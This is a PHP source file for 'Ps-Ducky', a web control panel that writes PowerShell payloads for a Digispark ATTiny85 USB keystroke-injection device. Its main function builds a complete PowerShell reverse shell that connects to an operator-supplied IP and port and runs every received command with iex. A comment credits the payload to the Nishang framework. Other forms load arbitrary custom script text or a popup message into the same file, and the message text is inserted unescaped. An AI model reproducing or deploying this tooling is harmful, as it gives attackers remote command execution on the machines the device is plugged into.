<?php session_start();
if(!isset($_SESSION['UserData']['Username'])){
header("location:login.php");
exit;
}
?>

<?php
// function for reverse shell :D using power shell
if(isset($_POST['edit_file']))
{
 $file_name="script.ps1";
 $server_ip=$_POST['server_ip'];
 $server_port=$_POST['server_port'];
 $write_text='$sm=(New-Object Net.Sockets.TCPClient("'.$server_ip.'",'.$server_port.')).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'; //powershell payload taken from nisang framework
 $folder="files/";
 $file_name=$folder."".$file_name;
 $edit_file = fopen($file_name, 'w');
	
 fwrite($edit_file, $write_text);
 fclose($edit_file);
}
?>

<?php
//function for custom script 
if(isset($_POST['custom_script']))
{
 $file_name="script.ps1";
 $write_text=$_POST['custom_text'];
 $folder="files/";
 $file_name=$folder."".$file_name;
 $custom_script = fopen($file_name, 'w');
	
 fwrite($custom_script, $write_text);
 fclose($custom_script);
}
?>

<?php
//function for msg box
if(isset($_POST['msg_script']))
{
 $file_name="script.ps1";
 $msg=$_POST['msg'];
 $write_text='$wshell = New-Object -ComObject Wscript.Shell; $wshell.Popup("'.$msg.'",0,"Done",0x1)';
 $folder="files/";
 $file_name=$folder."".$file_name;
 $msg_script = fopen($file_name, 'w');
	
 fwrite($msg_script, $write_text);
 fclose($msg_script);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Ps-Ducky | Web Interface</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <style>
    .navbar {
      margin-bottom: 0;
      border-radius: 0;
    }
  
      .foot {
        background-color: #555;
        color:#fff;
        margin-top: 10 px;
        padding-top: 10px;
        padding-bottom: 10px;
        }
  </style>
</head>
<body>

<nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
                            
      </button>
      <a class="navbar-brand"  class="active" href="#">Ps-Ducky</a>
    </div>
    <div class="collapse navbar-collapse" id="myNavbar">
      <ul class="nav navbar-nav">
        <li class="active"><a href="#">Script Loader</a></li>
        <li><a>V 0.1</a></li>
      </ul>
      <ul class="nav navbar-nav navbar-right">
        <li><a href="logout.php">Logout</a></li>
      </ul>
    </div>
  </div>
</nav>


<br/><br/>

<div class="container">

        <div class="row">
                <div class="col-md-3" style="margin-top:16px;">
                  <div class="panel panel-default">
                    <div class="panel-heading"><font color="#000"><b>YOUR HARDWARE   </b></font></div>
                    <div class="panel-body">
                    <?php  if (stripos(PHP_OS, 'win') === 0) {
                      echo '<font color="red" size="2px"><font color="#000" size="2px"> OS :- </font>'; 
                      echo php_uname("v");
                      echo ' </font>';
                      echo '<br/><font color="red" size="2px"><font color="#000" size="2px"> ARCH :- </font>'; 
                      echo php_uname("m");
                      echo ' </font>';
                      echo '<br/><font color="red" size="2px"><font color="#000" size="2px"> PHP :- </font>'; 
                      echo PHP_VERSION;
                      echo ' </font>';
                      echo '<br/><font color="red" size="2px"><font color="#000" size="2px"> IP : PORT :- </font>'; 
                      echo $_SERVER['SERVER_NAME']; echo '  :  ';echo $_SERVER['SERVER_PORT'];
                      echo ' </font>';
                      echo '<br/><font color="red" size="2px"><font color="#000" size="2px"> PATH :- </font>';
                      echo dirname(dirname($_SERVER['SCRIPT_FILENAME']));
                      echo ' </font>';
                      echo '<br/><font color="red" size="2px"><font color="#000" size="2px"> USER :- </font>';
                      echo get_current_user();
                      echo ' </font>';
                      } elseif (stripos(PHP_OS, 'linux') === 0) {
                        echo 'linux';
                     } elseif (stripos(PHP_OS, 'darwin') === 0) {
                        echo 'We Are not Supporting OSX';
                    }?>
                    </div>
                  </div>
                  <div class="panel panel-default">
                    <div class="panel-heading"><font color="#000"><b>Digispark ATTiny85</b></font></div>
                    <div class="panel-body">
                    <img src="img/pic.jpg" class="img-rounded" hight="200" width="200">
                    </div>
                  </div>
                  
              </div>
              

                <div class="col-lg-8">
                            <div class="panel-body">
                                    <ul class="list-group list-group-flush">
                                            <div class="panel panel-default">
                                               <div class="table-responsive">
                                                    <table class="table">
                                                        <thead>
                                                            <tr style="background-color:#f5f5f5;">
                                                                <th>ID</th>
                                                                <th>NAME</th>
                                                                <th>FUNCTIONS</th>
                                                                <th>EXECUTE</th>
                                                            </tr>
                                                        </thead>
                                                        <tbody>

                                                            <tr>
                                                                <td>1.</td>
                                                                <td>Reverse Shell</td>
                                                                <td><form method="post" action="" id="edit_form"> IP: <input type="text" name="server_ip"> PORT: <input type="text" name="server_port"></td>
                                                                <td><button type="submit" value="Edit File" name="edit_file" class="btn btn-success">LOAD</button></form></td>
                                                            </tr>
                                                            <tr>
                                                                <td>2.</td>
                                                                <td>Alert Box</td>
                                                                <td><form method="post" action="" id="edit_msg"> TEXT: <input type="text" name="msg" size="50"></td>
                                                                <td><button type="submit" value="Edit File" name="msg_script" class="btn btn-success">LOAD</button></form></td>
                                                            </tr>
                                                        
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </div> 
                                    </ul> 

                            </div>
                        
                    </div>

                          <div class="col-lg-5">
                            <div class="panel-body">
                                    <ul class="list-group list-group-flush">
                                            <div class="panel panel-default">
                                               <div class="table-responsive">
                                                    <table class="table">
                                                        <thead>
                                                            <tr>
                                                                <div style="padding-left: 10px;padding-top: 10px;padding-bottom: 10px;color:#000;background-color:#f5f5f5;"><b>CUSTOM SCRIPT</b></div>
                                                            </tr>
                                                        </thead>
                                                        <tbody>
                                                            <tr>
                                                                <td><form method="post" action="" id="edit_custom"><textarea name="custom_text" class="form-control" rows="2" id="cls"> </textarea></td>
                                                                <td><button type="submit" value="Edit File" name="custom_script" class="btn btn-success" style="padding-left:16px;padding-right:16px;"> LOAD </button><br/><div style="margin-top: 5px;"></div><button onclick="document.getElementById('myInput').value = ''" class="btn btn-info">CLEAR</button></form></td>
                                                            </tr>
                                                            
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </div> 
                                    </ul> 

                          </div>
                          
                        
                    </div>
                
              </div>

</div>


<div class="foot"><center><b><font size="3">Made with <span style="color: #e74c3c">&hearts;</span> by spidersec.ninja</font></b></center></div>

</body>
</html>
